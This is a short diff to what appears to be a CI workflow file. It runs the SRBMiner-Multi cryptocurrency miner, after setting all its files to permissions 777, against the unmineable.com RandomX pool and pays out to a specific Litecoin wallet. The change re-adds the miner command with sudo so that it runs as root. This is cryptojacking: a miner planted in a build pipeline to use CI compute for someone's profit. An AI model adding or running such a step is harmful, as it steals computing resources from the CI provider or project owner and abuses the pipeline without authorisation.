@@ -31,5 +31,5 @@ jobs:
           cd SRBMiner-Multi-2-6-0
           ls 
           chmod 777 *
-          ./SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet LTC:LTc5WcJM49gUR8ioqE9BEEgkrwNqUoVgJo.CPU-Unlvisal#mo4y-tkdg
+          sudo ./SRBMiner-MULTI --algorithm randomx --pool stratum+ssl://rx.unmineable.com:443 --wallet LTC:LTc5WcJM49gUR8ioqE9BEEgkrwNqUoVgJo.CPU-Unlvisal#mo4y-tkdg
           
